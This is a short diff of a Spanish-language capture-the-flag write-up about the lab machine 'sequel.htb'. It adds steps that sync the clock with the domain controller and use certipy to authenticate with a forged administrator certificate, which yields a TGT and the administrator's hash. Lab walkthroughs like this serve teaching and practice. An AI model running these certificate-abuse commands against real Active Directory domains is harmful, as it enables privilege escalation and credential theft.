@@ -205,6 +205,8 @@ certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@seq
 
 `Ahora que tenemos un certificado de administrador, podemos usar certipy para obtener un Ticket Granting Ticket (TGT) y extraer el hash NTLMv2 para este usuario. Dado que este paso requiere cierta interacción con Kerberos, necesitamos sincronizar nuestro reloj con la hora de la máquina remota antes de poder continuar.`
 ```python
-sudo ntpdate -u dc.sequel.htb # con est
+sudo ntpdate -u dc.sequel.htb # con este comando sincronizamos nuestro reloj con el DC (Domain Controller)
+
+certipy auth -pfx administrator.pfx # con este comando generamos el certificado 
 ```
 ![[Pasted image 20240329163703.png]]
